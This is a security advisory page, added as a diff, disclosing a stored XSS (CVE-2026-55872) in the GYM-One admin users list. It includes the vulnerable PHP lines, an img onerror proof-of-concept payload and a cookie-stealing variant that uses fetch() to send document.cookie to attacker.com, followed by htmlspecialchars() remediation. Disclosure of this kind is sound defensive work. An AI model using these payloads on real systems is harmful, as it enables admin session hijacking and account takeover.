@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CVE-2026-55872 | Stored XSS in GYM-One v1.1.0 | Lennart Hostettler</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Stored XSS in GYM-One v1.1.0. Discovered by Lennart Hostettler.">
+    <meta name="robots" content="index, follow">
+
+    <meta property="og:title" content="CVE-2026-55872 | Stored XSS in GYM-One v1.1.0">
+    <meta property="og:description" content="Stored XSS in GYM-One v1.1.0. Discovered by Lennart Hostettler.">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://hostettler.pro/posts/gymone-stored-xss.html">
+    <meta property="og:image" content="https://hostettler.pro/preview-image.jpg">
+    <meta property="og:image:width" content="1280">
+    <meta property="og:image:height" content="853">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="CVE-2026-55872 | Stored XSS in GYM-One v1.1.0">
+    <meta name="twitter:description" content="Stored XSS in GYM-One v1.1.0. Discovered by Lennart Hostettler.">
+    <meta name="twitter:image" content="https://hostettler.pro/preview-image.jpg">
+
+    <link rel="canonical" href="https://hostettler.pro/posts/gymone-stored-xss.html">
+    <link rel="icon" href="/favicon.ico">
+    <link rel="stylesheet" href="/style.css">
+    <link rel="stylesheet" href="/assets/atom-one-dark.min.css">
+
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "headline": "Stored XSS in GYM-One v1.1.0",
+    "datePublished": "2026-06-12",
+    "url": "https://hostettler.pro/posts/gymone-stored-xss.html",
+    "author": {
+        "@type": "Person",
+        "name": "Lennart Hostettler",
+        "url": "https://hostettler.pro/"
+    }
+}
+    </script>
+</head>
+<body>
+    <header>
+        <h1 id="heading">lennart.hostettler@debian:~/posts</h1>
+        <nav id="menu">
+            <ul>
+                <li><a href="/">Home</a></li>
+                <li><a href="/publications.html">Publications</a></li>
+                <li><a class="active" href="/cves.html">CVEs</a></li>
+                <li><a href="https://github.com/MinisterForDubiousNetworkActivities" title="GitHub" aria-label="GitHub"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="currentColor" style="vertical-align:middle"><path d="M12 0C5.374 0 0 5.373 0 12c0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0 1 12 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z"/></svg></a></li>
+                <li><a href="https://www.linkedin.com/in/lennart-hostettler-8a2680297/" title="LinkedIn" aria-label="LinkedIn"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="currentColor" style="vertical-align:middle"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 0 1-2.063-2.065 2.064 2.064 0 1 1 2.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a></li>
+                <li><a href="/feeds.html" title="RSS Feeds" aria-label="RSS Feeds"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="currentColor" style="vertical-align:middle"><path d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19.01 7.38 20 6.18 20C4.98 20 4 19.01 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1z"/></svg></a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main>
+
+        <p class="post-date">12/06/2026 &mdash; Security Advisory</p>
+        <h2>CVE-2026-55872 &mdash; Stored XSS in GYM-One v1.1.0</h2>
+
+        <table class="meta-table">
+            <tr><td>Product</td><td><a href="https://github.com/mayerbalintdev/GYM-One">GYM-One</a></td></tr>
+            <tr><td>Version</td><td>v1.1.0</td></tr>
+            <tr><td>File</td><td><code>admin/users/index.php</code></td></tr>
+            <tr><td>CVE</td><td>CVE-2026-55872</td></tr>
+            <tr><td>CWE</td><td>CWE-79 &mdash; Improper Neutralization of Input During Web Page Generation</td></tr>
+            <tr><td>CVSS 3.1 Vector</td><td>AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N</td></tr>
+            <tr><td>CVSS Score</td><td><span class="severity-high">8.7 (High)</span></td></tr>
+            <tr><td>Auth Required</td><td>Yes (user registration)</td></tr>
+            <tr><td>Discovered by</td><td>Lennart Hostettler</td></tr>
+        </table>
+
+        <h2>Description</h2>
+        <p>GYM-One v1.1.0 is vulnerable to Stored Cross-Site Scripting in <code>admin/users/index.php</code>. The fields <code>firstname</code>, <code>lastname</code>, and <code>email</code> from the <code>users</code> table are rendered directly into HTML without <code>htmlspecialchars()</code> or any output encoding:</p>
+        <pre><code class="language-php">echo &quot;&lt;td&gt;&quot; . $row[&quot;firstname&quot;] . &quot;&lt;/td&gt;&quot;; // line 409
+echo &quot;&lt;td&gt;&quot; . $row[&quot;lastname&quot;] . &quot;&lt;/td&gt;&quot;;  // line 410
+echo &quot;&lt;td&gt;&quot; . $row[&quot;email&quot;];               // line 411</code></pre>
+        <p>A registered user can inject arbitrary HTML/JavaScript into their profile fields. The payload executes in the browser of any admin who visits <code>/admin/users/</code>.</p>
+        <h2>Proof of Concept</h2>
+        <h4>&gt; Step 1 &mdash; Inject payload via registration</h4>
+        <p>Register a new user with the following <code>firstname</code>:</p>
+        <pre><code class="language-html">&lt;img src=x onerror=alert(1)&gt;</code></pre>
+        <p>For session hijacking:</p>
+        <pre><code class="language-html">&lt;img src=x onerror=&quot;fetch(&#x27;https://attacker.com/?c=&#x27;+document.cookie)&quot;&gt;</code></pre>
+        <h4>&gt; Step 2 &mdash; Trigger</h4>
+        <p>Admin navigates to:</p>
+        <pre><code class="language-http">GET /admin/users/</code></pre>
+        <p>Result: The injected script executes in the admin&#x27;s browser context.</p>
+        <h2>Impact</h2>
+        <ul>
+            <li><strong>Admin session hijacking</strong> via cookie exfiltration &rarr; full account takeover</li>
+            <li><strong>Credential theft</strong> by injecting a fake login overlay</li>
+            <li><strong>Persistent</strong> &mdash; payload fires for every admin who opens the user list until the record is deleted</li>
+        </ul>
+        <h2>Remediation</h2>
+        <p>Wrap all database output in <code>htmlspecialchars()</code> before rendering:</p>
+        <pre><code class="language-php">echo &quot;&lt;td&gt;&quot; . htmlspecialchars($row[&quot;firstname&quot;], ENT_QUOTES, &#x27;UTF-8&#x27;) . &quot;&lt;/td&gt;&quot;;
+echo &quot;&lt;td&gt;&quot; . htmlspecialchars($row[&quot;lastname&quot;],  ENT_QUOTES, &#x27;UTF-8&#x27;) . &quot;&lt;/td&gt;&quot;;
+echo &quot;&lt;td&gt;&quot; . htmlspecialchars($row[&quot;email&quot;],     ENT_QUOTES, &#x27;UTF-8&#x27;) . &quot;&lt;/td&gt;&quot;;</code></pre>
+    </main>
+
+    <footer>
+        <p>Contact: <a href="mailto:lennart.hostettler@proton.me">💌 lennart.hostettler@proton.me</a></p>
+        <p><a href="/privacy.html">Privacy Policy</a></p>
+    </footer>
+    <script src="/assets/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+</body>
+</html>
